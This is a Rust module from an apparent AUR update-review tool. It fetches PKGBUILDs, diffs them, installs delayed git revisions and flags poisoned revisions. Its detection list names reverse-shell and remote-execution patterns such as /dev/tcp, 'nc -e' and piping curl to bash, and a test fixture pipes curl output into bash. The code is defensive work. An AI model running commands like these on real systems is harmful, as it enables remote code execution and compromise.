//! Interactions with the AUR: list of updates, last-modified date
//! (RPC API) and retrieval of the PKGBUILD diff.

use crate::t;
use anyhow::{bail, Context, Result};
use serde::Deserialize;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

/// Number of seconds in a day.
pub const SECS_PER_DAY: u64 = 86_400;
/// Marker for a version that cannot be resolved statically (VCS packages, e.g. `-git`).
pub const DYNAMIC_VERSION: &str = "?";

/// AUR host (RPC API, git repositories, raw PKGBUILDs).
const AUR_HOST: &str = "https://aur.archlinux.org";
/// User-Agent sent on HTTP requests to the AUR.
const USER_AGENT: &str = "aurveto";
/// Maximum number of packages per RPC request (bounds the URL length).
const RPC_BATCH: usize = 50;

/// An available AUR update.
#[derive(Debug, Clone)]
pub struct Update {
    pub name: String,
    pub old_ver: String,
    pub new_ver: String,
}

/// Current Unix timestamp (seconds).
pub fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Lists AUR updates via `<helper> -Qua`.
/// Expected output: "name old -> new".
pub fn list_updates(helper: &str) -> Result<Vec<Update>> {
    let out = Command::new(helper)
        .args(["-Qua"])
        .output()
        .with_context(|| format!("running `{helper} -Qua`"))?;
    // -Qua returns a non-zero code when there is no update: we ignore it.
    let text = String::from_utf8_lossy(&out.stdout);
    let mut updates = Vec::new();
    for line in text.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        // format: name old -> new
        if parts.len() >= 4 && parts[2] == "->" {
            updates.push(Update {
                name: parts[0].to_string(),
                old_ver: parts[1].to_string(),
                new_ver: parts[3].to_string(),
            });
        } else if !parts.is_empty() {
            updates.push(Update {
                name: parts[0].to_string(),
                old_ver: String::new(),
                new_ver: String::new(),
            });
        }
    }
    Ok(updates)
}

/// Useful AUR metadata for a package.
#[derive(Debug, Clone)]
pub struct PkgInfo {
    pub package_base: String,
    pub last_modified: u64,
}

#[derive(Deserialize)]
struct RpcInfo {
    #[serde(rename = "Name")]
    name: String,
    #[serde(rename = "PackageBase")]
    package_base: String,
    #[serde(rename = "LastModified")]
    last_modified: u64,
}

#[derive(Deserialize)]
struct RpcResponse {
    results: Vec<RpcInfo>,
}

/// Fetches the metadata (PackageBase, LastModified) via the RPC v5 API.
pub fn fetch_infos(names: &[String]) -> Result<HashMap<String, PkgInfo>> {
    let mut map = HashMap::new();
    if names.is_empty() {
        return Ok(map);
    }
    // The API accepts multiple arg[]= ; we split into batches to avoid an
    // overly long URL.
    for chunk in names.chunks(RPC_BATCH) {
        let query: String = chunk
            .iter()
            .map(|n| format!("arg[]={}", urlencode(n)))
            .collect::<Vec<_>>()
            .join("&");
        let url = format!("{AUR_HOST}/rpc/v5/info?{query}");
        let resp: RpcResponse = ureq::get(&url)
            .set("User-Agent", USER_AGENT)
            .call()
            .with_context(|| "AUR RPC API call")?
            .into_json()
            .context("parsing RPC JSON")?;
        for info in resp.results {
            map.insert(
                info.name,
                PkgInfo {
                    package_base: info.package_base,
                    last_modified: info.last_modified,
                },
            );
        }
    }
    Ok(map)
}

/// Lists official-repo updates via `checkupdates`
/// (format "name old -> new"). These packages are signed and outside
/// aurveto's review scope.
pub fn official_updates() -> Vec<String> {
    Command::new("checkupdates")
        .output()
        .ok()
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

/// Lists the installed AUR ("foreign") packages via `pacman -Qmq`.
pub fn installed_aur_packages() -> Vec<String> {
    Command::new("pacman")
        .args(["-Qmq"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .map(|l| l.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

/// Map name -> `LastModified` timestamp (used by the `status` command).
pub fn last_modified(names: &[String]) -> Result<HashMap<String, u64>> {
    Ok(fetch_infos(names)?
        .into_iter()
        .map(|(k, v)| (k, v.last_modified))
        .collect())
}

/// Minimal URL encoding (AUR package names rarely contain special characters,
/// but we handle `+` and a few others).
fn urlencode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

/// Downloads a package's current PKGBUILD from the AUR.
pub fn fetch_remote_pkgbuild(name: &str) -> Result<String> {
    let url = format!(
        "{AUR_HOST}/cgit/aur.git/plain/PKGBUILD?h={}",
        urlencode(name)
    );
    let body = ureq::get(&url)
        .set("User-Agent", USER_AGENT)
        .call()
        .with_context(|| format!("downloading the PKGBUILD of {name}"))?
        .into_string()
        .context("reading the PKGBUILD body")?;
    Ok(body)
}

/// Tries to locate the local PKGBUILD of the **installed** version in the
/// helper's cache.
///
/// The cached copy is only trustworthy when its own version matches
/// `installed_version`: the helper refreshes its clone whenever it checks for
/// updates, so the cached PKGBUILD is frequently ALREADY the new revision.
/// Diffing against that would produce an empty diff and clear the package
/// without any review. Fail-closed: an unmatched cache is treated as "no
/// reference", which triggers a full inspection instead.
pub fn local_pkgbuild(name: &str, installed_version: &str) -> Option<String> {
    let home = dirs::home_dir()?;
    let candidates = [
        home.join(".cache/yay").join(name).join("PKGBUILD"),
        home.join(".cache/paru/clone").join(name).join("PKGBUILD"),
    ];
    for path in candidates {
        if let Ok(text) = std::fs::read_to_string(&path) {
            if vercmp(&parse_version(&text), installed_version) == 0 {
                return Some(text);
            }
        }
    }
    None
}

/// Builds a unified diff between the local (installed) PKGBUILD and the remote one.
/// If the local one cannot be found, returns the entire remote PKGBUILD annotated
/// as a "first inspection".
pub fn pkgbuild_diff(name: &str, installed_version: &str) -> Result<String> {
    let remote = fetch_remote_pkgbuild(name)?;
    match local_pkgbuild(name, installed_version) {
        Some(local) if local.trim() == remote.trim() => Ok(String::new()),
        Some(local) => Ok(unified_diff(&local, &remote, name)),
        None => Ok(format!(
            "# No local reference PKGBUILD — full inspection of the remote PKGBUILD:\n{remote}"
        )),
    }
}

// =====================================================================
// LAG mode: install the PKGBUILD revision that was HEAD N days ago, via the
// AUR repository's git history.
// =====================================================================

/// "Deferred" revision targeted by lag mode.
#[derive(Debug, Clone)]
pub struct LagTarget {
    pub pkgbase: String,
    pub commit: String,
    /// Version (epoch:pkgver-pkgrel) at this commit, or "?" if dynamic (VCS).
    pub version: String,
    /// Unix timestamp (seconds) of the target commit: lets us show the real age
    /// of the revision that will be installed. 0 if the date could not be read.
    pub committed_at: u64,
    /// PKGBUILD contents at this commit (for the review).
    pub pkgbuild: String,
}

fn aur_cache_dir() -> Result<PathBuf> {
    let base = dirs::cache_dir().context("cache dir not found")?;
    Ok(base.join("aurveto").join("git"))
}

fn run_git(dir: &Path, args: &[&str]) -> Result<String> {
    let out = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .output()
        .with_context(|| format!("git {args:?}"))?;
    if !out.status.success() {
        bail!(
            "git {:?}: {}",
            args,
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// Clones (or updates) the pkgbase's AUR git repository and returns its path.
pub fn ensure_git_repo(pkgbase: &str) -> Result<PathBuf> {
    let dir = aur_cache_dir()?.join(pkgbase);
    if dir.join(".git").exists() {
        run_git(&dir, &["fetch", "--quiet", "origin"])?;
    } else {
        std::fs::create_dir_all(dir.parent().unwrap())?;
        let url = format!("{AUR_HOST}/{pkgbase}.git");
        let out = Command::new("git")
            .args(["clone", "--quiet", &url])
            .arg(&dir)
            .output()
            .context("git clone")?;
        if !out.status.success() {
            bail!(
                "cloning {url}: {}",
                String::from_utf8_lossy(&out.stderr).trim()
            );
        }
    }
    Ok(dir)
}

/// The pkgbase's AUR repository as already cached (cloned if absent, but not
/// re-fetched): for the steps that follow a fetch within the same evaluation.
fn cached_repo(pkgbase: &str) -> Result<PathBuf> {
    let dir = aur_cache_dir()?.join(pkgbase);
    if dir.join(".git").exists() {
        return Ok(dir);
    }
    ensure_git_repo(pkgbase)
}

/// Determines the revision that was HEAD before `before_epoch`.
pub fn lagged_target(pkgbase: &str, before_epoch: u64) -> Result<Option<LagTarget>> {
    let dir = ensure_git_repo(pkgbase)?;
    let before = format!("--before=@{before_epoch}");
    // origin/HEAD points to the default branch (master on the AUR).
    let commit = run_git(&dir, &["rev-list", "-1", &before, "origin/HEAD"])
        .or_else(|_| run_git(&dir, &["rev-list", "-1", &before, "origin/master"]))?
        .trim()
        .to_string();
    if commit.is_empty() {
        return Ok(None); // the package did not exist yet N days ago
    }
    let pkgbuild = run_git(&dir, &["show", &format!("{commit}:PKGBUILD")]).unwrap_or_default();
    let version = parse_version(&pkgbuild);
    // Target commit date: `%ct` = the committer's Unix timestamp.
    let committed_at = run_git(&dir, &["show", "-s", "--format=%ct", &commit])
        .ok()
        .and_then(|s| s.trim().parse::<u64>().ok())
        .unwrap_or(0);
    Ok(Some(LagTarget {
        pkgbase: pkgbase.to_string(),
        commit,
        version,
        committed_at,
        pkgbuild,
    }))
}

/// Extracts the version from a PKGBUILD (static only).
fn parse_version(pkgbuild: &str) -> String {
    let pick = |key: &str| -> String {
        pkgbuild
            .lines()
            .find_map(|l| l.trim().strip_prefix(key))
            .map(|v| v.trim().trim_matches('\'').trim_matches('"').to_string())
            .unwrap_or_default()
    };
    let ver = pick("pkgver=");
    if ver.is_empty() || ver.contains('$') {
        return DYNAMIC_VERSION.to_string(); // dynamic version (VCS): not handled in lag mode
    }
    let rel = pick("pkgrel=");
    let epoch = pick("epoch=");
    let base = if rel.is_empty() {
        ver
    } else {
        format!("{ver}-{rel}")
    };
    if epoch.is_empty() {
        base
    } else {
        format!("{epoch}:{base}")
    }
}

/// Helper name whose non-interactive flags differ from yay's.
const HELPER_PARU: &str = "paru";

/// Flags that stop an AUR helper from asking again what the decision chain has
/// already settled. `--noconfirm` alone is not enough: yay's diff / edit / clean
/// menus and paru's review pager still stop mid-run waiting for a keypress —
/// and they are enabled by the helper's own config file, not by our command
/// line, so the answers have to be pinned explicitly.
pub fn helper_install_args(helper: &str) -> &'static [&'static str] {
    if helper == HELPER_PARU {
        &["--needed", "--noconfirm", "--skipreview"]
    } else {
        &[
            "--needed",
            "--noconfirm",
            "--answerdiff=None",
            "--answeredit=None",
            "--answerclean=None",
        ]
    }
}

/// Installs the latest version of `names` through the configured AUR helper.
/// Non-interactive by design: every package handed here was already cleared by
/// the decision chain, so a second round of prompts only invites a blind "yes".
/// Returns true if the helper succeeded.
pub fn install_latest(helper: &str, names: &[String]) -> Result<bool> {
    let status = Command::new(helper)
        .arg("-S")
        .args(helper_install_args(helper))
        .args(names)
        .status()
        .with_context(|| format!("launching {helper}"))?;
    Ok(status.success())
}

/// Builds and installs the deferred revision (checkout + makepkg -si).
/// Returns true if the installation succeeded.
pub fn install_lagged(target: &LagTarget) -> Result<bool> {
    let dir = ensure_git_repo(&target.pkgbase)?;
    run_git(&dir, &["checkout", "--quiet", &target.commit])?;
    let status = Command::new("makepkg")
        .args(["-si", "--noconfirm"])
        .current_dir(&dir)
        .status()
        .context("launching makepkg")?;
    // Return to the default branch for subsequent fetches.
    let _ = run_git(&dir, &["checkout", "--quiet", "origin/HEAD"])
        .or_else(|_| run_git(&dir, &["checkout", "--quiet", "master"]));
    Ok(status.success())
}

/// Compares two versions via pacman's `vercmp` tool.
/// Returns >0 if `a` is strictly more recent than `b`, 0 if equal, <0 otherwise.
///
/// Fail-closed: if `vercmp` is unavailable or its output unreadable, returns a
/// negative value — never "more recent". No caller therefore treats a version as
/// installable for lack of a reliable comparison.
pub fn vercmp(a: &str, b: &str) -> i32 {
    match Command::new("vercmp").args([a, b]).output() {
        Ok(out) if out.status.success() => String::from_utf8_lossy(&out.stdout)
            .trim()
            .parse()
            .unwrap_or(-1),
        _ => {
            eprintln!("  (vercmp unavailable: cannot compare versions, update skipped)");
            -1
        }
    }
}

/// Maximum number of commits inspected while walking back the history to date the
/// next installable revision (bounds the cost on a package with a long history).
const MAX_UPGRADE_SCAN: usize = 200;

/// Next installable lag revision: the OLDEST one more recent than the installed
/// version. It is the one that will mature first and actually be installed.
#[derive(Debug, Clone)]
pub struct NextUpgrade {
    /// Commit date (Unix s): the deadline = `committed_at + delay`.
    pub committed_at: u64,
    /// Version of this revision (what will be installed at the deadline).
    pub version: String,
}

/// Next revision strictly more recent than `installed` in the git history (the
/// oldest of the set), with its date and version. `None` if nothing is more
/// recent.
///
/// Unlike `last_modified` (which tracks the *latest* publication and resets to
/// zero on each new commit), this datum is anchored on a specific commit: a later
/// publication does not push back an already-acquired deadline, and the announced
/// version is indeed the one that will be installed. Reuses the already-present
/// git repository (no fetch); called after `lagged_target`.
pub fn next_upgrade(pkgbase: &str, installed: &str) -> Result<Option<NextUpgrade>> {
    let dir = cached_repo(pkgbase)?;
    // Commits from newest to oldest, with their commit date (%ct).
    let log = run_git(&dir, &["log", "--format=%H %ct", "origin/HEAD"])
        .or_else(|_| run_git(&dir, &["log", "--format=%H %ct", "master"]))?;

    let mut candidate = None;
    for line in log.lines().take(MAX_UPGRADE_SCAN) {
        let mut parts = line.split_whitespace();
        let (Some(commit), Some(ts)) = (parts.next(), parts.next()) else {
            continue;
        };
        let pkgbuild = run_git(&dir, &["show", &format!("{commit}:PKGBUILD")]).unwrap_or_default();
        let version = parse_version(&pkgbuild);
        if version == DYNAMIC_VERSION {
            continue; // VCS revision: no comparable version
        }
        if vercmp(&version, installed) > 0 {
            // Walking down: each time we keep the oldest revision so far.
            candidate = ts.parse::<u64>().ok().map(|committed_at| NextUpgrade {
                committed_at,
                version,
            });
        } else {
            break; // we have reached the installed version (or earlier)
        }
    }
    Ok(candidate)
}

/// Commits whose PKGBUILD carries exactly the `installed` version: the
/// revisions the user may have built. Several when the maintainer pushed a fix
/// without bumping `pkgrel` — we cannot tell which one was installed, so the
/// caller must trust only what they all share. Empty when unknown (VCS version,
/// rewritten history, version older than `MAX_UPGRADE_SCAN` commits).
pub fn installed_revisions(pkgbase: &str, installed: &str) -> Result<Vec<String>> {
    let dir = cached_repo(pkgbase)?;
    let log = run_git(&dir, &["log", "--format=%H", "origin/HEAD"])
        .or_else(|_| run_git(&dir, &["log", "--format=%H", "origin/master"]))?;
    let mut found = Vec::new();
    for commit in log.lines().take(MAX_UPGRADE_SCAN) {
        let pkgbuild = run_git(&dir, &["show", &format!("{commit}:PKGBUILD")]).unwrap_or_default();
        let version = parse_version(&pkgbuild);
        if version == DYNAMIC_VERSION {
            continue;
        }
        match vercmp(&version, installed) {
            0 => found.push(commit.to_string()),
            c if c < 0 => break, // walked past the installed version
            _ => {}
        }
    }
    Ok(found)
}

/// Current HEAD commit of the pkgbase's AUR repository (freshly fetched): the
/// revision a helper installs when it takes the latest version.
pub fn head_commit(pkgbase: &str) -> Result<String> {
    let dir = ensure_git_repo(pkgbase)?;
    let commit = run_git(&dir, &["rev-parse", "origin/HEAD"])
        .or_else(|_| run_git(&dir, &["rev-parse", "origin/master"]))?;
    Ok(commit.trim().to_string())
}

/// A revision's files exported to a temporary directory, deleted on drop.
pub struct RevisionTree {
    dir: PathBuf,
}

impl RevisionTree {
    /// Directory holding the revision's files (PKGBUILD, install scripts…).
    pub fn path(&self) -> &Path {
        &self.dir
    }
}

impl Drop for RevisionTree {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.dir);
    }
}

/// Name of the transient archive `export_revision` unpacks.
const EXPORT_ARCHIVE: &str = "revision.tar";

/// Exports **every** file of `commit` (not just the PKGBUILD: install scripts
/// and patches are where payloads hide) so a scanner sees what makepkg builds.
pub fn export_revision(pkgbase: &str, commit: &str) -> Result<RevisionTree> {
    let repo = cached_repo(pkgbase)?;
    let dir = std::env::temp_dir().join(format!("aurveto-{pkgbase}-{commit}"));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
    let tree = RevisionTree { dir };
    let archive = tree.dir.join(EXPORT_ARCHIVE);
    let archive_arg = archive.to_string_lossy().to_string();
    run_git(
        &repo,
        &["archive", "--format=tar", "-o", &archive_arg, commit],
    )?;
    let out = Command::new("tar")
        .arg("-xf")
        .arg(&archive)
        .arg("-C")
        .arg(&tree.dir)
        .output()
        .context("tar")?;
    if !out.status.success() {
        bail!(
            "unpacking {commit}: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    std::fs::remove_file(&archive).context("removing the export archive")?;
    Ok(tree)
}

/// Remote code execution / reverse shell patterns in a PKGBUILD.
/// Returns the labels of the detected patterns.
fn danger_signatures(pkgbuild: &str) -> Vec<&'static str> {
    let low = pkgbuild.to_lowercase();
    let compact = low
        .replace(" | ", "|")
        .replace("| ", "|")
        .replace(" |", "|");
    let checks: [(&str, &str); 9] = [
        ("|bash", "pipe to bash"),
        ("|sh", "pipe to sh"),
        ("base64 -d", "base64 decode"),
        ("base64 --decode", "base64 decode"),
        ("/dev/tcp/", "/dev/tcp reverse shell"),
        ("eval \"$(", "command eval"),
        ("eval $(", "command eval"),
        ("nc -e", "netcat reverse shell"),
        ("curl -s http", "opaque curl download"),
    ];
    let mut hits = Vec::new();
    for (pat, label) in checks {
        if compact.contains(pat) && !hits.contains(&label) {
            hits.push(label);
        }
    }
    hits
}

/// Guard against a "poisoned version left in the history": has the target
/// revision been reverted/cleaned since? Returns Some(reason) if suspicious.
///
/// Two signals:
///   A. a commit after `commit` mentions a compromise;
///   B. a dangerous execution pattern present in the target revision has
///      disappeared from the current HEAD (a sign of post-incident cleanup).
pub fn reverted_since(pkgbase: &str, commit: &str) -> Result<Option<String>> {
    let dir = cached_repo(pkgbase)?;
    let target = run_git(&dir, &["show", &format!("{commit}:PKGBUILD")]).unwrap_or_default();
    let head = run_git(&dir, &["show", "origin/HEAD:PKGBUILD"])
        .or_else(|_| run_git(&dir, &["show", "master:PKGBUILD"]))
        .unwrap_or_default();

    // B. dangerous pattern removed since (strong signal, few false positives).
    let target_sigs = danger_signatures(&target);
    if !target_sigs.is_empty() {
        let head_sigs = danger_signatures(&head);
        let removed: Vec<&str> = target_sigs
            .into_iter()
            .filter(|s| !head_sigs.contains(s))
            .collect();
        if !removed.is_empty() {
            return Ok(Some(t!(
                "dangerous pattern present in the target revision but removed since: {}",
                removed.join(", ")
            )));
        }
    }

    // A. message of a later commit hinting at a compromise.
    let log = run_git(
        &dir,
        &["log", "--format=%s %b", &format!("{commit}..origin/HEAD")],
    )
    .or_else(|_| {
        run_git(
            &dir,
            &["log", "--format=%s %b", &format!("{commit}..master")],
        )
    })
    .unwrap_or_default();
    let low = log.to_lowercase();
    const MAL: [&str; 7] = [
        "malicious",
        "malware",
        "backdoor",
        "compromise",
        "hijack",
        "trojan",
        "exfiltr",
    ];
    if let Some(kw) = MAL.iter().find(|k| low.contains(**k)) {
        return Ok(Some(t!("a later commit mentions “{}”", kw)));
    }

    Ok(None)
}

/// Unified diff between the installed PKGBUILD and a given new content.
pub fn diff_against_installed(name: &str, installed_version: &str, new_pkgbuild: &str) -> String {
    match local_pkgbuild(name, installed_version) {
        Some(local) if local.trim() == new_pkgbuild.trim() => String::new(),
        Some(local) => unified_diff(&local, new_pkgbuild, name),
        None => format!("# No local reference — full inspection:\n{new_pkgbuild}"),
    }
}

/// In-house unified diff (no external dependency): enough to give context to
/// the AI and the user.
fn unified_diff(old: &str, new: &str, name: &str) -> String {
    let old_lines: Vec<&str> = old.lines().collect();
    let new_lines: Vec<&str> = new.lines().collect();
    let mut out = format!("--- {name} (installed)\n+++ {name} (AUR)\n");
    let max = old_lines.len().max(new_lines.len());
    for i in 0..max {
        let o = old_lines.get(i);
        let n = new_lines.get(i);
        match (o, n) {
            (Some(a), Some(b)) if a == b => out.push_str(&format!("  {a}\n")),
            (Some(a), Some(b)) => {
                out.push_str(&format!("- {a}\n+ {b}\n"));
            }
            (Some(a), None) => out.push_str(&format!("- {a}\n")),
            (None, Some(b)) => out.push_str(&format!("+ {b}\n")),
            (None, None) => {}
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn static_version_is_extracted() {
        let pk = "pkgname=x\npkgver=1.2.3\npkgrel=2\n";
        assert_eq!(parse_version(pk), "1.2.3-2");
    }

    #[test]
    fn version_with_epoch() {
        let pk = "pkgver=1.0\npkgrel=1\nepoch=2\n";
        assert_eq!(parse_version(pk), "2:1.0-1");
    }

    #[test]
    fn dynamic_vcs_version_not_handled() {
        let pk = "pkgver=r1234.$(git rev-parse)\npkgrel=1\n";
        assert_eq!(parse_version(pk), DYNAMIC_VERSION);
    }

    #[test]
    fn pipe_bash_pattern_detected() {
        let pk = "package(){ curl -fsSL https://x | bash; }";
        assert!(danger_signatures(pk).contains(&"pipe to bash"));
    }

    #[test]
    fn clean_pkgbuild_has_no_signature() {
        let pk = "package(){ install -Dm755 app \"$pkgdir/usr/bin/app\"; }";
        assert!(danger_signatures(pk).is_empty());
    }

    #[test]
    fn urlencode_handles_special_characters() {
        assert_eq!(urlencode("c++-gtk"), "c%2B%2B-gtk");
        assert_eq!(urlencode("simple-bin"), "simple-bin");
    }
}
